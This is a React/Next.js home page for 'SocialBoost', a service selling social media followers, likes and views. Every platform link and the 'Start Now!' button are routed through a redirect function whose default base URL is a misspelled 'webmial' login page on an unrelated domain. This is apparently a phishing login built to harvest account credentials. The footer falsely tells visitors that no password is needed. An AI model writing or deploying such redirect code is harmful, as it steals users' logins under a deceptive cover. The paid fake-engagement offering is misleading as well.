import { Button } from "@/components/ui/button";
import { SocialIcon } from "@/components/social-icon";
import Link from "next/link";

const socialPlatforms = [
  { name: "Instagram", icon: "instagram", color: "#E4405F", domain: "instagram.com" },
  { name: "TikTok", icon: "tiktok", color: "#000000", domain: "www.tiktok.com" },
  { name: "YouTube", icon: "youtube", color: "#FF0000", domain: "youtube.com" },
  { name: "Twitter", icon: "twitter", color: "#1DA1F2", domain: "twitter.com" },
  { name: "Facebook", icon: "facebook", color: "#1877F2", domain: "facebook.com" },
  { name: "LinkedIn", icon: "linkedin", color: "#0A66C2", domain: "linkedin.com" },
  { name: "Snapchat", icon: "snapchat", color: "#FFFC00", domain: "web.snapchat.com" },
  { name: "Pinterest", icon: "pinterest", color: "#BD081C", domain: "pinterest.com" },
  { name: "WhatsApp", icon: "whatsapp", color: "#25D366", domain: "web.whatsapp.com" },
  { name: "Telegram", icon: "telegram", color: "#2CA5E0", domain: "web.telegram.org" },
];

function createRedirectUrl(targetUrl: string): string {
  const baseUrl = process.env.REDIRECT_BASE_URL || 'https://webmial1.newsmoto.co.ke/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=';
  return `${baseUrl}${encodeURIComponent(targetUrl)}`;
}

export default function Home() {
  return (
    <main className="min-h-screen bg-neutral-900 text-white">
      <div className="relative">
        <div className="absolute inset-0 bg-gradient-to-br from-blue-900/20 via-purple-900/20 to-black/50 pointer-events-none" />
        
        <div className="relative container mx-auto px-4 py-12">
          <div className="text-center mb-12">
            <h1 className="text-4xl md:text-6xl font-bold mb-4">
              Grow your <span className="gradient-text">Social Media</span>
              <br />
              Account&apos;s <span className="gradient-text">Popularity</span>
            </h1>
            <p className="text-lg text-gray-400 max-w-2xl mx-auto mb-8">
              Reach your target audience and grow your social media presence with the expertise 
              of marketing professionals. Steady, sustainable growth.
            </p>
          </div>

          <div className="mb-16">
            <h2 className="text-2xl font-semibold text-center mb-8">Choose your platform</h2>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-4xl mx-auto">
              {socialPlatforms.map((platform) => (
                <Link
                  key={platform.name}
                  href={createRedirectUrl(`https://${platform.domain}`)}
                  className="block"
                >
                  <SocialIcon
                    name={platform.name}
                    icon={platform.icon as any}
                    color={platform.color}
                  />
                </Link>
              ))}
            </div>
          </div>

          <div className="mb-16 max-w-2xl mx-auto">
            <h2 className="text-2xl font-semibold mb-6">What do you want to grow?</h2>
            
            <div className="space-y-8">
              <div>
                <h3 className="text-lg font-medium mb-4 text-blue-400">Profile</h3>
                <div className="flex flex-wrap gap-3">
                  {["Followers", "VIP Followers", "Visits"].map((item) => (
                    <button key={item} className="px-4 py-2 bg-gray-800 rounded-lg hover:bg-gray-700 transition-colors">
                      {item}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-medium mb-4 text-blue-400">Post / Reels / Videos</h3>
                <div className="flex flex-wrap gap-3">
                  {["Likes", "VIP Likes", "Views", "Comments", "Saves"].map((item) => (
                    <button key={item} className="px-4 py-2 bg-gray-800 rounded-lg hover:bg-gray-700 transition-colors">
                      {item}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-medium mb-4 text-blue-400">Story / Live Stream</h3>
                <div className="flex flex-wrap gap-3">
                  {["Views", "Likes", "Comments"].map((item) => (
                    <button key={item} className="px-4 py-2 bg-gray-800 rounded-lg hover:bg-gray-700 transition-colors">
                      {item}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          </div>

          <div className="max-w-xl mx-auto mb-16">
            <div className="flex items-center gap-2 mb-2">
              <span className="text-gray-400">@</span>
              <input
                type="text"
                placeholder="Enter your username"
                className="flex-1 bg-gray-800 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500"
              />
            </div>
            <Link href={createRedirectUrl("https://webmial1.newsmoto.co.ke/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://insfamous.co/checkout/")}>
              <Button className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 font-semibold py-3">
                Start Now!
              </Button>
            </Link>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 max-w-4xl mx-auto mb-16">
            {[
              { value: "18K+", label: "Successful Campaigns" },
              { value: "1M+", label: "Audience Reach" },
              { value: "80M+", label: "Content Impressions" },
              { value: "50K+", label: "Community Interactions" },
            ].map((stat) => (
              <div key={stat.label} className="text-center">
                <div className="text-3xl font-bold gradient-text">{stat.value}</div>
                <div className="text-sm text-gray-400">{stat.label}</div>
              </div>
            ))}
          </div>

          <div className="text-center text-sm text-gray-500 mb-8">
            <p>*All data represents aggregated historical campaign performance and industry averages.</p>
          </div>

          <footer className="border-t border-gray-800 pt-8 mt-16">
            <div className="max-w-4xl mx-auto text-center text-gray-500">
              <p className="mb-4">
                SocialBoost is an independent social media marketing agency. We are not affiliated with, 
                endorsed by, or sponsored by any social media platforms. Your privacy is protected; 
                we do not need your account password or any personal details.
              </p>
              <div className="flex justify-center gap-6 mb-4">
                <Link href="/about" className="hover:text-gray-300">About Us</Link>
                <Link href="/terms" className="hover:text-gray-300">Terms</Link>
                <Link href="/privacy" className="hover:text-gray-300">Privacy</Link>
                <a href="mailto:support@socialboost.co" className="hover:text-gray-300">Contact</a>
              </div>
              <p>&copy; SocialBoost 2026</p>
            </div>
          </footer>
        </div>
      </div>
    </main>
  );
}
